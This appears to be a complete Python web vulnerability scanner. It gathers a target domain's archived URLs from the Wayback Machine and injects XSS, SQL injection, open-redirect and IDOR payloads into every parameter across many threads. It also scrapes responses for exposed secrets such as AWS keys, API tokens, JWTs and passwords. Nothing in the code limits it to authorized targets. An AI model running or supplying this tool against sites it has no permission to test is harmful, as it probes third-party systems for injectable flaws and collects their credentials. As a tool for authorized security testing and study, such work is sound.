import requests
import re
import argparse
from urllib.parse import urlparse, urljoin, urlencode, quote
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm

# Parameters and payloads
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"'><script>alert(1)</script>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "\u003cscript\u003ealert(1)\u003c/script\u003e"
]

REDIRECT_PARAMS = ["next", "redirect", "url", "return", "dest", "path", "continue"]
REDIRECT_PAYLOADS = [
    "https://google.com",
    "//google.com",
    "\\google.com",
    "/\\google.com",
    "%2f%2fgoogle.com"
]

IDOR_PARAMS = ["id", "user", "uid", "userid", "account", "accountid", "profile"]
IDOR_TEST_VALUES = ["1", "2", "999999999", "abc", "test"]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "admin' --",
    "' UNION SELECT null, version() --",
    "' AND SLEEP(5) --",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR 'a'='a",
    "') OR ('1'='1--",
    "admin' #",
    "admin'/*"
]

SENSITIVE_PATTERNS = {
    "JWT": r"eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+",
    "AWS Access Key": r"AKIA[0-9A-Z]{16}",
    "AWS Secret Key": r"(?i)aws(.{0,20})?(secret|private)?(.{0,20})?['\"][0-9a-zA-Z\/+]{40}['\"]",
    "Google API Key": r"AIza[0-9A-Za-z-_]{35}",
    "API Key": r"(?i)(api[_-]?key|token|secret|access[_-]?token|auth[_-]?token)[\"'=:\s]+([a-z0-9-_]{16,})",
    "Email": r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+",
    "Password": r"(?i)(password|pwd|pass)[\"'=:\s]+([a-zA-Z0-9@#%$!^&*]{6,})"
}

# Wayback fetcher
def get_wayback_urls(domain):
    urls = set()
    try:
        r = requests.get(
            f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&fl=original&collapse=urlkey",
            timeout=15)
        if r.status_code == 200:
            data = r.json()
            for entry in data[1:]:
                urls.add(entry[0])
    except Exception:
        pass
    return list(urls)

def get_params_from_url(url):
    parsed = urlparse(url)
    q = parsed.query
    params = []
    if q:
        params = [p.split('=')[0] for p in q.split('&') if '=' in p]
    return params

def replace_param_value(url, param, value):
    parsed = urlparse(url)
    base = parsed.scheme + "://" + parsed.netloc + parsed.path
    query = dict([p.split('=', 1) if '=' in p else (p, '') for p in parsed.query.split('&') if p])
    query[param] = value
    return base + "?" + urlencode(query)

def fetch_url(url, method="GET", params=None, data=None, allow_redirects=True, timeout=10):
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) vulnscanner/1.0"}
    try:
        if method.upper() == "POST":
            r = requests.post(url, data=data, headers=headers, timeout=timeout, allow_redirects=allow_redirects)
        else:
            r = requests.get(url, params=params, headers=headers, timeout=timeout, allow_redirects=allow_redirects)
        return r
    except Exception:
        return None

def scan_xss(url):
    results = []
    params = get_params_from_url(url)
    if not params:
        return results
    for param in params:
        for payload in XSS_PAYLOADS:
            test_url = replace_param_value(url, param, payload)
            r = fetch_url(test_url)
            if r and payload in r.text:
                results.append({
                    "url": test_url,
                    "param": param,
                    "payload": payload
                })
                break  # Found on this param, move to next param
    return results

def scan_open_redirect(url):
    results = []
    params = get_params_from_url(url)
    if not params:
        return results
    for param in params:
        if param.lower() not in REDIRECT_PARAMS:
            continue
        for payload in REDIRECT_PAYLOADS:
            test_url = replace_param_value(url, param, payload)
            r = fetch_url(test_url, allow_redirects=False)
            if r and 'Location' in r.headers:
                loc = r.headers['Location'].lower()
                if "google.com" in loc:
                    results.append({
                        "url": test_url,
                        "param": param,
                        "payload": payload,
                        "redirect_location": r.headers['Location']
                    })
                    break
    return results

def scan_idor(url):
    results = []
    params = get_params_from_url(url)
    if not params:
        return results
    for param in params:
        if param.lower() not in IDOR_PARAMS:
            continue
        # Get original response
        orig_r = fetch_url(url)
        if not orig_r:
            continue
        orig_len = len(orig_r.text)
        for test_val in IDOR_TEST_VALUES:
            test_url = replace_param_value(url, param, test_val)
            r = fetch_url(test_url)
            if r:
                # Compare response length heuristic
                diff = abs(len(r.text) - orig_len)
                # If response differs significantly, possible IDOR or parameter sensitive info
                if diff > 50 and r.status_code == 200:
                    results.append({
                        "url": test_url,
                        "param": param,
                        "tested_value": test_val
                    })
                    break
    return results

def scan_sqli(url):
    results = []
    params = get_params_from_url(url)
    if not params:
        return results
    for param in params:
        for payload in SQLI_PAYLOADS:
            test_url = replace_param_value(url, param, payload)
            r = fetch_url(test_url)
            if r:
                content = r.text.lower()
                # Check for common SQL errors or warnings
                if any(x in content for x in ["sql syntax", "mysql", "you have an error", "warning", "unclosed quotation mark", "syntax error", "sqlstate"]):
                    results.append({
                        "url": test_url,
                        "param": param,
                        "payload": payload
                    })
                    break
    return results

def scan_sensitive_info(url):
    results = []
    r = fetch_url(url)
    if not r:
        return results
    for name, pattern in SENSITIVE_PATTERNS.items():
        matches = re.findall(pattern, r.text)
        for match in matches:
            # match can be tuple if regex has groups, so flatten it
            if isinstance(match, tuple):
                match = match[1] if len(match) > 1 else match[0]
            if len(match) > 5:  # avoid short false positives
                results.append({
                    "url": url,
                    "type": name,
                    "value": match
                })
    return results

def scan_url(url):
    result = {
        "url": url,
        "XSS": [],
        "OpenRedirect": [],
        "IDOR": [],
        "SQLi": [],
        "SensitiveInfo": []
    }
    result["XSS"] = scan_xss(url)
    result["OpenRedirect"] = scan_open_redirect(url)
    result["IDOR"] = scan_idor(url)
    result["SQLi"] = scan_sqli(url)
    result["SensitiveInfo"] = scan_sensitive_info(url)
    return result

def print_results(results):
    for res in results:
        url = res["url"]
        print(f"\n==== Scan results for: {url} ====")

        if res["SQLi"]:
            print("\033[91mSQL Injection Found:\033[0m")
            for item in res["SQLi"]:
                print(f"  - {item['url']} (param: {item['param']}, payload: {item['payload']})")

        if res["IDOR"]:
            print("\033[95mIDOR/Parameter Manipulation Found:\033[0m")
            for item in res["IDOR"]:
                print(f"  - {item['url']} (param: {item['param']}, tested_value: {item['tested_value']})")

        if res["OpenRedirect"]:
            print("\033[93mOpen Redirect Found:\033[0m")
            for item in res["OpenRedirect"]:
                print(f"  - {item['url']} (param: {item['param']}, redirect location: {item['redirect_location']})")

        if res["XSS"]:
            print("\033[92mXSS Found:\033[0m")
            for item in res["XSS"]:
                print(f"  - {item['url']} (param: {item['param']}, payload: {item['payload']})")

        if res["SensitiveInfo"]:
            print("\033[96mSensitive Information Found:\033[0m")
            for item in res["SensitiveInfo"]:
                print(f"  - {item['type']}: {item['value']} (on URL: {item['url']})")

        if not (res["SQLi"] or res["IDOR"] or res["OpenRedirect"] or res["XSS"] or res["SensitiveInfo"]):
            print("  No vulnerabilities found.")

def main():
    parser = argparse.ArgumentParser(description="Vulnerability scanner (XSS, Open Redirect, SQLi, IDOR, Sensitive Info).")
    parser.add_argument("--list", required=True, help="File with list of domains or URLs to scan.")
    parser.add_argument("--threads", type=int, default=20, help="Number of concurrent threads (default 20).")
    args = parser.parse_args()

    # Read domains/URLs from list file
    with open(args.list, "r") as f:
        domains = [line.strip() for line in f if line.strip()]

    print(f"[*] Gathering URLs from wayback for {len(domains)} domains...")
    all_urls = set()
    for d in tqdm(domains):
        all_urls.add(d)
        all_urls.update(get_wayback_urls(d))

    print(f"[*] Starting scan on {len(all_urls)} URLs with {args.threads} threads...")
    results = []
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(scan_url, url): url for url in all_urls}
        for future in tqdm(as_completed(futures), total=len(futures)):
            res = future.result()
            results.append(res)

    print_results(results)

if __name__ == "__main__":
    main()
